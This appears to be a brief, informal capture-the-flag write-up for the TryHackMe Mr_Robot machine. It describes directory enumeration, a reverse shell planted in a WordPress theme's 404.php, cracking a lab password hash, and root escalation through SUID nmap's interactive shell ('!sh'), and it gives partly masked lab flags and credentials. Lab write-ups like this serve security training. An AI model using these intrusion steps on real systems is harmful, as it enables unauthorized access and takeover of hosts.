# TryHackMe: Mr_Robot

---

By: *UnknownPerson*

---

nmap -sC -sV -Pn -vv {IP}

## Port Scanning: {80,443}
```plaintext

Let's do some directory Buster using :- 
> gobutster dir -u http://{ip} -w {Wordlist Location}

Form this we get one of key from robots.txt site map :- 

```
Key1 :- key-1-of-3.txt :- 07340---a58a1f80d9///55fb3***4b9
--

```
And we get so may Directory from that /licence Is intresting from this 
Source code we get credetial 
```

Credential Of Wp-login :- el***t:E-2\\***2
--

## Intial Access

```
Now we get Intial Access on Wp-login wordpress site Let's Get revshell from simple Way 

> We got appearance > editor > 404.php 
> in this we add out Pentestmoneky php reverse shell code then awake the 404 error code on site And we get Intial Access
> Throw in /home/robot we get password encrypted file :- "password.raw-md5" throw this we get our Password for robot user
robot:c3fcd3d76192e4007dfb496cca67e13b
```
## Privillage Escallation

```
Let's first find SUID bit 
using :- find / -user root -perm -4000 -print 2>/dev/null

We get intresting binary og nmap let' get root sh tetminal throw this
```
/usr/local/bin/nmap --interactive
!sh
--

*Wow We get Root Shell And Access in key-2-of-3.txt from /home/robot and key3-of-3.key from /root*

As this way we agin Pawned New machine
--